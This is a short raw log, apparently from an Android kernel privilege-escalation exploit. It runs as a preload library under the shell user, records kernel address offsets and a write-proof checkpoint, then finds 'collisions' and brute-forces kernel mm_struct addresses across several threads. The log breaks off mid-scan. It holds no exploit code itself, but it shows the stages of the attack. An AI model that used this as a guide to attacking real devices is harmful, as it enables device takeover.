===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788950835.txt tmp=/data/local/tmp/.temp/log_1788950835.txt pid=14380 uid=2000
1788950836.084 14380 [+] preload starting pid=14380
1788950836.086 14380 [+] startup context pid=14380 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788950836.087 14380 [+] build config pid=14380 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788950836.092 14380 [+] p0 profile pid=14380 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788950836.094 14380 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788950836.095 14380 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=572969d4-57e7-49b4-8a9a-e53a242f9978 (odd: leaked scratch, even: aligned bootid+3)
1788950838.118 14380 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788950840.705 14380 [*] pile-up verified: approx_time=2398
1788950840.707 14380 [*] start finding collisisons
1788950840.709 14380 [*] target    000000793f0080c8
1788950841.782 14380 [*]   00000066a58df6f8
1788950842.244 14380 [*]   00000066a5bdfef8
1788950842.560 14380 [*]   00000066a5d5dae8
1788950842.792 14380 [*]   00000066a5dbfdf8
1788950843.013 14380 [*]   00000066a5df4fa0
1788950843.587 14380 [*]   00000066a6308840
1788950844.392 14380 [*]   00000066a6b02810
1788950844.674 14380 [*]   00000066a6c12090
1788950844.964 14380 [*]   00000066a6d33998
1788950845.793 14380 [*]   00000066a74eb758
1788950849.163 14380 [*]   00000066aa09e4f0
1788950850.937 14380 [*]   00000066ab6de6f0
1788950852.423 14380 [*]   00000066ac971b88
1788950853.059 14380 [*]   00000066acfd7eb8
1788950853.252 14380 [*]   00000066ad031188
1788950853.256 14380 [*] found 15 collisisons
1788950858.328 14380 [*] start bruteforcing
1788950858.335 14380 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788950858.335 14380 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788950858.336 14380 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788950858.336 14380 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
1788950858.336 14380 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788950858.337 14380 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788950858.337 14380 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788950858.337 14380 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788950858.339 14380 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
1788950858.341 14380 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
1788950858.346 14380 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
1788950858.346 14380 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
1788950858.346 14380 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
1788950858.347 14380 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
1788950858.349 14380 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
1788950858.349 14380 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
